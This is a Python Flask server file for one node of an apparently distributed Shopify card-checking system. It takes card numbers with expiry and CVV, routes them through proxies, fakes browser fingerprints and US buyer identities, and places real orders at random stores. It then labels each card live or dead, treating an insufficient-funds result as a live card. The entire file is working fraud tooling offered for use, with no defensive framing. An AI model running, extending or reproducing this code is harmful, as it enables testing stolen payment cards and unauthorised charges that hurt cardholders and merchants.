"""
app.py — Shopify Checkout Node Server
======================================
Flask server for ONE node. Called by node_client.py on the controller side.

Endpoints:
  GET /?card=ccn|mm|yy|cvv&proxy=host:port[:user:pass]
      Runs full Shopify checkout → returns JSON:
          Response : "ORDER_PLACED" | "CARD_DECLINED" | "INSUFFICIENT_FUNDS"
                   | "GENERIC_ERROR" | "3DS_AUTHENTICATION_REQUIRED"
                   | "PROPOSAL_FAILED" | "CART_FAILED" | "PCI_FAILED" | ...
          Gate     : "Shopify Payments"
          Charged  : "True" | "False"
          Approved : "True" | "False"
          Price    : "12.34 USD"
          Time     : "1234"   (ms)
          success  : bool

  GET /health
      Returns {"status":"ok","workers_busy":N,"workers_cap":M}
"""

import os
import random
import re
import html
import string
import uuid
import time
import json
import threading
import urllib3
from urllib.parse import quote, urlencode
from flask import Flask, request, jsonify
from curl_cffi import requests

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

app = Flask(__name__)

# ─────────────────────────────────────────────────────────────────────────────
# ⚡ WORKER TRACKING (for /health)
# ─────────────────────────────────────────────────────────────────────────────
_workers_busy = 0
_workers_cap  = int(os.environ.get("WORKERS_CAP", "20"))
_workers_lock = threading.Lock()

# ─────────────────────────────────────────────────────────────────────────────
# ⚡ TLS CONFIG
# ─────────────────────────────────────────────────────────────────────────────
BROWSER_PROFILES = ["chrome124", "chrome120", "chrome116", "chrome110", "chrome107", "edge101", "safari15_5", "safari17_0"]

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36 Edg/123.0.0.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0",
]

# ─────────────────────────────────────────────────────────────────────────────
# 🎭 US IDENTITIES ONLY
# ─────────────────────────────────────────────────────────────────────────────
FIRST_NAMES   = ["james", "john", "robert", "michael", "william", "david", "richard", "joseph", "thomas", "charles"]
LAST_NAMES    = ["smith", "johnson", "williams", "brown", "jones", "garcia", "miller", "davis", "rodriguez", "martinez"]
EMAIL_DOMAINS = ["gmail.com", "yahoo.com", "outlook.com", "hotmail.com"]

ADDRESSES = [
    {"street": "100 SW Main St",          "city": "Portland", "state": "OR", "zip": "97204", "phone": "+15035550100"},
    {"street": "223 Pioneer Blvd",        "city": "Salem",    "state": "OR", "zip": "97301", "phone": "+15035550101"},
    {"street": "101 N Last Chance Gulch", "city": "Helena",   "state": "MT", "zip": "59601", "phone": "+14065550100"},
    {"street": "1 Granite St",            "city": "Concord",  "state": "NH", "zip": "03301", "phone": "+16035550100"},
    {"street": "100 W 10th St",           "city": "Wilmington","state": "DE","zip": "19801", "phone": "+13025550100"},
]

def generate_identity():
    fn = random.choice(FIRST_NAMES)
    ln = random.choice(LAST_NAMES)
    email = f"{fn.lower()}.{ln.lower()}{random.randint(1,9999)}@{random.choice(EMAIL_DOMAINS)}"
    a = random.choice(ADDRESSES)
    return fn, ln, email, a["street"], a["city"], a["state"], a["zip"], a["phone"]

def random_suffix(n=10):
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=n))

def _street_addr(addr):
    """Convert internal addr dict → Shopify streetAddress shape."""
    return {
        "address1":    addr.get("street", ""),
        "city":        addr.get("city", ""),
        "countryCode": "US",
        "postalCode":  addr.get("zip", ""),
        "firstName":   addr.get("fn", ""),
        "lastName":    addr.get("ln", ""),
        "zoneCode":    addr.get("state", ""),
        "phone":       addr.get("phone", ""),
    }

# ─────────────────────────────────────────────────────────────────────────────
# 🔌 PROXY PARSING
# ─────────────────────────────────────────────────────────────────────────────
def _parse_proxy(proxy_str):
    """Accept host:port:user:pass, user:pass@host:port, or with scheme."""
    if not proxy_str:
        return ""
    p = proxy_str.strip()
    for scheme in ("socks5://", "socks5h://", "http://", "https://"):
        if p.startswith(scheme):
            p = p[len(scheme):]
            break
    if "@" in p:
        return f"socks5h://{p}"
    parts = p.split(":")
    if len(parts) == 2:
        return f"socks5h://{parts[0]}:{parts[1]}"
    if len(parts) >= 4:
        host, port, user = parts[0], parts[1], parts[2]
        pw = ":".join(parts[3:])
        return f"socks5h://{user}:{pw}@{host}:{port}"
    return f"socks5h://{p}"

# ─────────────────────────────────────────────────────────────────────────────
# 🔍 EXTRACTION HELPERS
# ─────────────────────────────────────────────────────────────────────────────
def extract_session_token(raw_html):
    patterns = [
        r'<meta\s+name="serialized-sessionToken"\s+content="([^"]*)"',
        r'"X-Checkout-One-Session-Token"\s*:\s*"([^"]+)"',
        r'"sessionToken"\s*:\s*"([^"]+)"',
    ]
    for pat in patterns:
        m = re.search(pat, raw_html)
        if m:
            t = m.group(1).strip()
            if t.startswith("&quot;"): t = t[6:]
            if t.endswith("&quot;"):   t = t[:-6]
            t = t.strip('"\'')
            if len(t) > 50:
                return t
    return ""

def extract_commit_sha(checkout_html):
    m = re.search(r'"commitSha"\s*:\s*"([a-f0-9]{40})"', html.unescape(checkout_html))
    return m.group(1) if m else ""

def extract_stable_id(checkout_html):
    m = re.search(r'"stableId"\s*:\s*"([0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12})"', html.unescape(checkout_html))
    return m.group(1) if m else ""

def extract_queue_token(proposal_json):
    m = re.search(r'"queueToken"\s*:\s*"([^"]+)"', proposal_json)
    return m.group(1) if m else ""

def extract_signed_handles(proposal_json):
    try:
        d = json.loads(proposal_json)
        seller = d.get("data",{}).get("session",{}).get("negotiate",{}).get("result",{}).get("sellerProposal",{})
        de = seller.get("deliveryExpectations",{})
        if de.get("__typename") == "FilledDeliveryExpectationTerms":
            return [x["signedHandle"] for x in de.get("deliveryExpectations",[]) if x.get("signedHandle")]
    except Exception:
        pass
    return []

def extract_delivery_handle(proposal_body):
    # JSON path first
    try:
        d = json.loads(proposal_body)
        seller = d.get("data",{}).get("session",{}).get("negotiate",{}).get("result",{}).get("sellerProposal",{})
        sds = seller.get("selectedDeliveryStrategy",{})
        if isinstance(sds, dict) and sds.get("handle"):
            return sds["handle"]
        for dg in seller.get("deliveryGroups",[]):
            if isinstance(dg, dict):
                for opt in dg.get("deliveryOptions",[]):
                    if isinstance(opt, dict) and opt.get("handle"):
                        return opt["handle"]
    except Exception:
        pass
    # Regex fallbacks
    for pat in [
        r'"selectedDeliveryStrategy"\s*:\s*\{[^{}]*"handle"\s*:\s*"([^"]+)"',
        r'"handle"\s*:\s*"([^"]+)"[^}]{0,120}"__typename"\s*:\s*"CompleteDeliveryStrategy"',
        r'"__typename"\s*:\s*"CompleteDeliveryStrategy"[^}]{0,120}"handle"\s*:\s*"([^"]+)"',
    ]:
        m = re.search(pat, proposal_body)
        if m:
            return m.group(1)
    return ""

def extract_payment_method_id(proposal_body):
    """Robust: JSON tree traversal, then regex fallback."""
    try:
        data = json.loads(proposal_body)
        found = []
        def walk(o):
            if isinstance(o, dict):
                if isinstance(o.get("paymentMethodIdentifier"), str):
                    found.append(o)
                for v in o.values():
                    walk(v)
            elif isinstance(o, list):
                for x in o:
                    walk(x)
        walk(data)
        for m in found:
            if "shopify_payment" in str(m.get("name", "")).lower():
                return m["paymentMethodIdentifier"]
        return found[0]["paymentMethodIdentifier"] if found else ""
    except Exception:
        m = re.search(r'"paymentMethodIdentifier"\s*:\s*"([^"]+)"', proposal_body)
        return m.group(1) if m else ""

def extract_checkout_total(proposal_body):
    try:
        d = json.loads(proposal_body)
        seller = d.get("data",{}).get("session",{}).get("negotiate",{}).get("result",{}).get("sellerProposal",{})
        amt = seller.get("total",{}).get("value",{}).get("amount","")
        if amt:
            return amt
    except Exception:
        pass
    m = re.search(r'"checkoutTotal"\s*:\s*\{\s*"value"\s*:\s*\{\s*"amount"\s*:\s*"([^"]+)"', proposal_body)
    return m.group(1) if m else ""

def extract_tax_amount(proposal_json):
    try:
        d = json.loads(proposal_json)
        seller = d.get("data",{}).get("session",{}).get("negotiate",{}).get("result",{}).get("sellerProposal",{})
        return seller.get("tax",{}).get("totalTaxAmount",{}).get("value",{}).get("amount","0.0")
    except Exception:
        return "0.0"

def extract_receipt_id(submit_body):
    m = re.search(r'"id"\s*:\s*"(gid://shopify/\w+Receipt/[A-Za-z0-9]+)"', submit_body)
    return m.group(1) if m else ""

def extract_receipt_session_token(submit_body):
    m = re.search(r'"sessionToken"\s*:\s*"([^"]+)"', submit_body)
    return m.group(1) if m else ""

def extract_code(body):
    m = re.search(r'"code"\s*:\s*"([^"]+)"', body)
    return m.group(1) if m else ""

# ─────────────────────────────────────────────────────────────────────────────
# 🔑 DYNAMIC GRAPHQL IDS
# ─────────────────────────────────────────────────────────────────────────────
def fetch_graphql_ids(session, shop_url, checkout_html, ua):
    m = re.search(r'(/cdn/shopifycloud/checkout-web/assets/c1/actions[A-Za-z0-9_-]*\.[A-Za-z0-9_-]+\.js)', checkout_html)
    if not m:
        return None, None, None
    try:
        js = session.get(shop_url + m.group(1), headers={"user-agent": ua}, timeout=10).text
        p = re.search(r'id:\s*"([a-f0-9]{64})"\s*,\s*type:\s*"query"\s*,\s*name:\s*"Proposal"', js)
        s = re.search(r'id:\s*"([a-f0-9]{64})"\s*,\s*type:\s*"mutation"\s*,\s*name:\s*"SubmitForCompletion"', js)
        q = re.search(r'id:\s*"([a-f0-9]{64})"\s*,\s*type:\s*"query"\s*,\s*name:\s*"PollForReceipt"', js)
        return (p.group(1) if p else None,
                s.group(1) if s else None,
                q.group(1) if q else None)
    except Exception:
        return None, None, None

# ─────────────────────────────────────────────────────────────────────────────
# 🛍️ CHEAPEST PRODUCT (multi-endpoint fallback)
# ─────────────────────────────────────────────────────────────────────────────
def find_cheapest_product(session, shop_url, ua):
    endpoints = [
        f"{shop_url}/products.json?limit=250",
        f"{shop_url}/collections/all/products.json?limit=250",
        f"{shop_url}/collections/frontpage/products.json?limit=250",
    ]
    for ep in endpoints:
        try:
            r = session.get(ep, headers={"user-agent": ua}, timeout=10)
            if r.status_code != 200:
                continue
            try:
                data = r.json()
            except Exception:
                continue
            products = data.get("products", []) if isinstance(data, dict) else []
            if not products:
                continue
            best_price = float("inf")
            best_variant = None
            best_price_str = ""
            for p in products:
                for v in p.get("variants", []):
                    if not v.get("available"):
                        continue
                    try:
                        price = float(str(v.get("price", "0")).replace(",", "."))
                    except Exception:
                        continue
                    if price > 0 and price < best_price:
                        best_price = price
                        best_variant = str(v.get("id"))
                        best_price_str = str(v.get("price", "")) or str(best_price)
            if best_variant:
                return best_variant, best_price_str
        except Exception:
            continue
    return None, None

# ─────────────────────────────────────────────────────────────────────────────
# 🛒 PROPOSAL PAYLOAD BUILDER (with `lines` fix)
# ─────────────────────────────────────────────────────────────────────────────
def build_proposal_payload(session_token, stable_id, variant_id, amount, currency, email, addr, proposal_id):
    if addr:
        sa  = _street_addr(addr)
        dest = {"partialStreetAddress": {
            "address1":    sa["address1"],
            "city":        sa["city"],
            "countryCode": "US",
            "lastName":    sa["lastName"],
            "phone":       "",
            "oneTimeUse":  False,
        }}
        bill = {"streetAddress": sa}
    else:
        dest = {"partialStreetAddress": {
            "address1": "", "city": "", "countryCode": "US",
            "lastName": "", "phone": "", "oneTimeUse": False,
        }}
        bill = None

    payment = {"totalAmount": {"any": True}, "paymentLines": []}
    if bill:
        payment["billingAddress"] = bill

    return {
        "variables": {
            "sessionInput": {"sessionToken": session_token},
            "queueToken":   None,
            "discounts":    {"lines": [], "acceptUnexpectedDiscounts": True},
            "delivery": {
                "deliveryLines": [{
                    "destination": dest,
                    "selectedDeliveryStrategy": {
                        "deliveryStrategyMatchingConditions": {
                            "estimatedTimeInTransit": {"any": True},
                            "shipments":              {"any": True},
                        },
                        "options": {},
                    },
                    "targetMerchandiseLines": {"any": True},
                    "deliveryMethodTypes":    ["SHIPPING"],
                    "expectedTotalPrice":     {"any": True},
                    "destinationChanged":     True,
                }],
                "noDeliveryRequired":   [],
                "useProgressiveRates":  False,
                "supportsSplitShipping": True,
            },
            "deliveryExpectations": {"deliveryExpectationLines": []},
            # ═══ FIX: merchandiseLines → lines ═══
            "merchandise": {"lines": [{
                "stableId": stable_id,
                "merchandise": {"productVariantReference": {
                    "id":        f"gid://shopify/ProductVariantMerchandise/{variant_id}",
                    "variantId": f"gid://shopify/ProductVariant/{variant_id}",
                }},
                "quantity":            {"items": {"value": 1}},
                "expectedTotalPrice":  {"value": {"amount": amount, "currencyCode": currency}},
            }]},
            "memberships": {"memberships": []},
            "payment":     payment,
            "buyerIdentity": {
                "customer":         {"presentmentCurrency": currency, "countryCode": "US"},
                "email":            email or None,
                "emailChanged":     bool(email),
                "phoneCountryCode": "US",
                "marketingConsent": [],
                "rememberMe":       False,
            },
            "taxes": {"proposedTotalAmount": {"any": True}},
        },
        "operationName": "Proposal",
        "id": proposal_id,
    }

# ─────────────────────────────────────────────────────────────────────────────
# 🔑 PCI TOKENIZATION
# ─────────────────────────────────────────────────────────────────────────────
def tokenize_card(session, ccn, mm, yyyy, cvv, name, shop_domain, ua):
    payload = {
        "credit_card": {
            "number":             ccn,
            "month":              int(mm),
            "year":               int(yyyy),
            "verification_value": cvv,
            "name":               name,
        },
        "payment_session_scope": shop_domain,
    }
    try:
        r = session.post(
            "https://checkout.pci.shopifyinc.com/sessions",
            json=payload,
            headers={"origin": "https://checkout.pci.shopifyinc.com", "user-agent": ua},
            timeout=15,
        )
        if r.status_code == 200:
            return r.json().get("id")
    except Exception:
        pass
    return None

# ─────────────────────────────────────────────────────────────────────────────
# 🚀 RESPONSE HELPER
# ─────────────────────────────────────────────────────────────────────────────
def _resp(response, *, charged=False, approved=False, price="0 USD", gate="Shopify Payments", elapsed_ms=None):
    d = {
        "Response": response,
        "Gate":     gate,
        "Charged":  "True" if charged  else "False",
        "Approved": "True" if approved else "False",
        "Price":    price,
        "success":  charged or approved,
    }
    if elapsed_ms is not None:
        d["Time"] = str(int(elapsed_ms))
    return jsonify(d)

def _classify_failed_code(code):
    """Map a Shopify FailedReceipt code to node_client's expected buckets."""
    c = code.upper()
    if "INSUFFICIENT" in c or c == "FUNDS":
        return "INSUFFICIENT_FUNDS", True, False   # approved=True signals live card
    if "GENERIC" in c:
        return "GENERIC_ERROR", False, False
    if c in ("CARD_DECLINED", "DECLINED", "DO_NOT_HONOR"):
        return "CARD_DECLINED", False, False
    if "EXPIRED" in c:
        return "CARD_EXPIRED", False, False
    if "INVALID" in c:
        return "INVALID_CARD", False, False
    if "BLOCKED" in c:
        return "BLOCKED_CARD", False, False
    return code or "CARD_DECLINED", False, False

# ─────────────────────────────────────────────────────────────────────────────
# 🧠 MAIN CHECK IMPLEMENTATION
# ─────────────────────────────────────────────────────────────────────────────
def _run_check(card_str, proxy_str):
    t_start = time.monotonic()

    # Parse card
    parts = card_str.split("|")
    if len(parts) < 4:
        return _resp("INVALID_CARD")
    ccn, mm, yy, cvv = parts[0], parts[1], parts[2], parts[3]
    yyyy = "20" + yy if len(yy) == 2 else yy

    # Load site pool
    shop_url = "https://thats-what-che-said.myshopify.com"
    try:
        with open("site.txt", "r") as f:
            sites = [line.strip() for line in f if line.strip()]
            if sites:
                shop_url = random.choice(sites)
    except Exception:
        pass

    proxy_url = _parse_proxy(proxy_str)

    ua  = random.choice(USER_AGENTS)
    imp = random.choice(BROWSER_PROFILES)

    session = requests.Session(impersonate=imp)
    if proxy_url:
        session.proxies = {"http": proxy_url, "https": proxy_url}

    try:
        # ── 1. Cheapest product ────────────────────────────────────────────
        variant_id, price = find_cheapest_product(session, shop_url, ua)
        if not variant_id:
            return _resp("PROPOSAL_FAILED")   # triggers retry on a different site

        # ── 2. Cart → Checkout ─────────────────────────────────────────────
        try:
            r = session.get(
                f"{shop_url}/cart/{variant_id}:1",
                headers={"user-agent": ua},
                allow_redirects=True,
                timeout=15,
            )
        except Exception:
            return _resp("CART_FAILED")
        if r.status_code != 200:
            return _resp("CART_FAILED")

        checkout_url  = r.url
        checkout_html = r.text

        cart_token_m = re.search(r'/checkouts/cn/([^/?]+)', checkout_url)
        cart_token   = cart_token_m.group(1) if cart_token_m else ""

        session_token = extract_session_token(checkout_html)
        commit_sha    = extract_commit_sha(checkout_html)
        stable_id     = extract_stable_id(checkout_html)
        if not (session_token and commit_sha and stable_id):
            return _resp("MISSING_STABLE_ID")

        # ── 3. GraphQL IDs ─────────────────────────────────────────────────
        prop_id, submit_id, poll_id = fetch_graphql_ids(session, shop_url, checkout_html, ua)
        if not prop_id:
            prop_id   = "6d9f0eb3d750c837c721c99da1ec1c7f1ce832d3687c5d0d0ffc1b42a610d3e8"
        if not submit_id:
            submit_id = "b3fd8db496438a6859c96db264b77e84b3f093d11a44c4d0a84d43e661f12419"
        if not poll_id:
            poll_id   = "978b340f3027dc55313349c4089004147b6b0dccee75e42ed97685ef1feae418"

        currency = "USD"
        m = re.search(r'"currencyCode"\s*:\s*"([A-Z]{3})"', checkout_html)
        if m:
            currency = m.group(1)

        amount = price
        m = re.search(r'"runningTotal"\s*:\s*\{\s*"value"\s*:\s*\{"amount"\s*:\s*"([\d.]+)"', checkout_html)
        if m:
            amount = m.group(1)

        # ── 4. Proposals (3-step handshake) ────────────────────────────────
        fn, ln, email, street, city, state, zipc, phone = generate_identity()
        addr = {
            "street": street, "city": city, "state": state,
            "zip": zipc, "fn": fn, "ln": ln, "phone": phone,
        }

        prop_headers = {
            "accept":                       "application/json",
            "content-type":                 "application/json",
            "origin":                       shop_url,
            "referer":                      checkout_url,
            "shopify-checkout-client":      "checkout-web/1.0",
            "shopify-checkout-source":      f'id="{cart_token}", type="cn"',
            "user-agent":                   ua,
            "x-checkout-one-session-token": session_token,
            "x-checkout-web-build-id":      commit_sha,
        }

        prop_endpoint = f"{shop_url}/checkouts/internal/graphql/persisted?operationName=Proposal"

        # Proposal 1
        try:
            payload = build_proposal_payload(session_token, stable_id, variant_id, amount, currency, None, None, prop_id)
            r1 = session.post(prop_endpoint, headers=prop_headers, json=payload, timeout=15)
        except Exception:
            return _resp("PROPOSAL_FAILED")
        if r1.status_code != 200:
            return _resp("PROPOSAL_FAILED")
        queue_token = extract_queue_token(r1.text) or None

        # Proposal 2 (email)
        try:
            payload = build_proposal_payload(session_token, stable_id, variant_id, amount, currency, email, None, prop_id)
            payload["variables"]["queueToken"] = queue_token
            r2 = session.post(prop_endpoint, headers=prop_headers, json=payload, timeout=15)
        except Exception:
            return _resp("PROPOSAL_FAILED")
        if r2.status_code != 200:
            return _resp("PROPOSAL_FAILED")

        # Proposal 3 (address)
        try:
            payload = build_proposal_payload(session_token, stable_id, variant_id, amount, currency, email, addr, prop_id)
            payload["variables"]["queueToken"] = queue_token
            r3 = session.post(prop_endpoint, headers=prop_headers, json=payload, timeout=15)
        except Exception:
            return _resp("PROPOSAL_FAILED")
        if r3.status_code != 200:
            return _resp("PROPOSAL_FAILED")

        payment_method_id = extract_payment_method_id(r3.text)
        delivery_handle   = extract_delivery_handle(r3.text)
        signed_handles    = extract_signed_handles(r3.text)
        tax_amount        = extract_tax_amount(r3.text)
        real_total        = extract_checkout_total(r3.text)
        if real_total:
            amount = real_total

        # If signed handles missing → retry proposal 3 once
        if not signed_handles:
            time.sleep(0.05)
            try:
                payload["variables"]["queueToken"] = queue_token
                r3b = session.post(prop_endpoint, headers=prop_headers, json=payload, timeout=15)
                if r3b.status_code == 200:
                    new_q = extract_queue_token(r3b.text)
                    if new_q:
                        queue_token = new_q
                    pm = extract_payment_method_id(r3b.text)
                    if pm:
                        payment_method_id = pm
                    dh = extract_delivery_handle(r3b.text)
                    if dh:
                        delivery_handle = dh
                    sh = extract_signed_handles(r3b.text)
                    if sh:
                        signed_handles = sh
                    tx = extract_tax_amount(r3b.text)
                    if tx:
                        tax_amount = tx
                    rt = extract_checkout_total(r3b.text)
                    if rt:
                        amount = rt
            except Exception:
                pass

        if not payment_method_id:
            return _resp("PAYMENTS_CREDIT_CARD_NOT_AVAILABLE")

        # ── 5. PCI tokenization ────────────────────────────────────────────
        session_id = tokenize_card(
            session, ccn, mm, yyyy, cvv,
            f"{fn} {ln}",
            shop_url.split("//")[1],
            ua,
        )
        if not session_id:
            return _resp("PCI_FAILED")

        # ── 6. Submit ──────────────────────────────────────────────────────
        sa = _street_addr(addr)
        submit_payload = {
            "variables": {
                "input": {
                    "sessionInput": {"sessionToken": session_token},
                    "queueToken":   queue_token,
                    "discounts":    {"lines": [], "acceptUnexpectedDiscounts": True},
                    "delivery": {
                        "deliveryLines": [{
                            "destination": {"streetAddress": sa},
                            "selectedDeliveryStrategy": {
                                "deliveryStrategyByHandle": {"handle": delivery_handle, "customDeliveryRate": False},
                                "options": {},
                            },
                            "targetMerchandiseLines": {"lines": [{"stableId": stable_id}]},
                            "deliveryMethodTypes":    ["SHIPPING"],
                            "expectedTotalPrice":     {"any": True},
                            "destinationChanged":     False,
                        }],
                        "noDeliveryRequired":   [],
                        "useProgressiveRates":  False,
                        "supportsSplitShipping": True,
                    },
                    "deliveryExpectations": {
                        "deliveryExpectationLines": [{"signedHandle": h} for h in signed_handles],
                    },
                    # ═══ FIX: merchandiseLines → lines ═══
                    "merchandise": {"lines": [{
                        "stableId": stable_id,
                        "merchandise": {"productVariantReference": {
                            "id":        f"gid://shopify/ProductVariantMerchandise/{variant_id}",
                            "variantId": f"gid://shopify/ProductVariant/{variant_id}",
                        }},
                        "quantity":           {"items": {"value": 1}},
                        "expectedTotalPrice": {"any": True},
                    }]},
                    "memberships": {"memberships": []},
                    "payment": {
                        "totalAmount": {"value": {"amount": amount, "currencyCode": currency}},
                        "paymentLines": [{
                            "paymentMethod": {
                                "directPaymentMethod": {
                                    "sessionId":               session_id,
                                    # ═══ FIX: add paymentMethodIdentifier ═══
                                    "paymentMethodIdentifier": payment_method_id,
                                    "billingAddress":          {"streetAddress": sa},
                                    "cardSource":              None,
                                }
                            },
                            "amount": {"value": {"amount": amount, "currencyCode": currency}},
                        }],
                        "billingAddress": {"streetAddress": sa},
                    },
                    "buyerIdentity": {
                        "customer":         {"presentmentCurrency": currency, "countryCode": "US"},
                        "email":            email,
                        "emailChanged":     False,
                        "phoneCountryCode": "US",
                        "marketingConsent": [],
                        "rememberMe":       False,
                    },
                    "taxes": {
                        "proposedTotalAmount": {"value": {"amount": tax_amount, "currencyCode": currency}},
                    },
                },
                "attemptToken": f"{cart_token}-{random_suffix()}",
                "metafields":   [],
                "analytics": {
                    "requestUrl": checkout_url,
                    "pageId":     str(uuid.uuid4()),
                },
            },
            "operationName": "SubmitForCompletion",
            "id": submit_id,
        }

        try:
            r_submit = session.post(
                f"{shop_url}/checkouts/internal/graphql/persisted?operationName=SubmitForCompletion",
                json=submit_payload,
                headers=prop_headers,
                timeout=15,
            )
        except Exception:
            return _resp("PROPOSAL_FAILED")
        submit_body = r_submit.text
        price_str   = f"{amount} {currency}"
        elapsed_ms  = (time.monotonic() - t_start) * 1000

        # ── 7. Interpret submit response ───────────────────────────────────
        # Success
        if '"ProcessedReceipt"' in submit_body or '"SuccessfulReceipt"' in submit_body:
            return _resp("ORDER_PLACED", charged=True, price=price_str, elapsed_ms=elapsed_ms)

        # 3DS
        if '"ActionRequiredReceipt"' in submit_body:
            return _resp("3DS_AUTHENTICATION_REQUIRED", approved=True, price=price_str, elapsed_ms=elapsed_ms)

        # Failed
        if '"FailedReceipt"' in submit_body:
            code = extract_code(submit_body) or "CARD_DECLINED"
            response, approved, charged = _classify_failed_code(code)
            return _resp(response, approved=approved, charged=charged, price=price_str, elapsed_ms=elapsed_ms)

        # Processing → poll
        if '"ProcessingReceipt"' in submit_body or '"ProcessingReceipt' in submit_body:
            receipt_id = extract_receipt_id(submit_body)
            rec_session = extract_receipt_session_token(submit_body)
            if receipt_id and rec_session:
                for _ in range(20):
                    time.sleep(0.5)
                    try:
                        params = {
                            "operationName": "PollForReceipt",
                            "variables": json.dumps({"receiptId": receipt_id, "sessionToken": rec_session}),
                            "id": poll_id,
                        }
                        poll_url  = f"{shop_url}/checkouts/internal/graphql/persisted?{urlencode(params)}"
                        r_poll    = session.get(poll_url, headers=prop_headers, timeout=15)
                        poll_body = r_poll.text

                        if '"SuccessfulReceipt"' in poll_body or '"ProcessedReceipt"' in poll_body:
                            elapsed_ms = (time.monotonic() - t_start) * 1000
                            return _resp("ORDER_PLACED", charged=True, price=price_str, elapsed_ms=elapsed_ms)
                        if '"ActionRequiredReceipt"' in poll_body:
                            elapsed_ms = (time.monotonic() - t_start) * 1000
                            return _resp("3DS_AUTHENTICATION_REQUIRED", approved=True, price=price_str, elapsed_ms=elapsed_ms)
                        if '"FailedReceipt"' in poll_body:
                            code = extract_code(poll_body) or "CARD_DECLINED"
                            response, approved, charged = _classify_failed_code(code)
                            elapsed_ms = (time.monotonic() - t_start) * 1000
                            return _resp(response, approved=approved, charged=charged, price=price_str, elapsed_ms=elapsed_ms)
                    except Exception:
                        continue

        # Fallback — try to extract any error
        code = extract_code(submit_body)
        if code:
            response, approved, charged = _classify_failed_code(code)
            return _resp(response, approved=approved, charged=charged, price=price_str, elapsed_ms=elapsed_ms)

        return _resp("PROPOSAL_FAILED", price=price_str, elapsed_ms=elapsed_ms)

    except Exception as e:
        return _resp(f"ERROR_{str(e)[:40]}")
    finally:
        try:
            session.close()
        except Exception:
            pass

# ─────────────────────────────────────────────────────────────────────────────
# 🌐 ROUTES
# ─────────────────────────────────────────────────────────────────────────────
@app.route("/")
def check_card():
    global _workers_busy
    with _workers_lock:
        _workers_busy += 1
    try:
        card_str  = request.args.get("card")
        proxy_str = request.args.get("proxy", "")
        if not card_str:
            return _resp("MISSING_CARD")
        return _run_check(card_str, proxy_str)
    except Exception as e:
        return _resp(f"ERROR_{str(e)[:40]}")
    finally:
        with _workers_lock:
            _workers_busy = max(0, _workers_busy - 1)

@app.route("/health")
def health():
    with _workers_lock:
        return jsonify({
            "status":       "ok",
            "workers_busy": _workers_busy,
            "workers_cap":  _workers_cap,
        })

# ─────────────────────────────────────────────────────────────────────────────
# ▶️ ENTRY POINT
# ─────────────────────────────────────────────────────────────────────────────
if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    print(f"[NODE] starting on 0.0.0.0:{port} (workers_cap={_workers_cap})", flush=True)
    app.run(host="0.0.0.0", port=port, threaded=True)
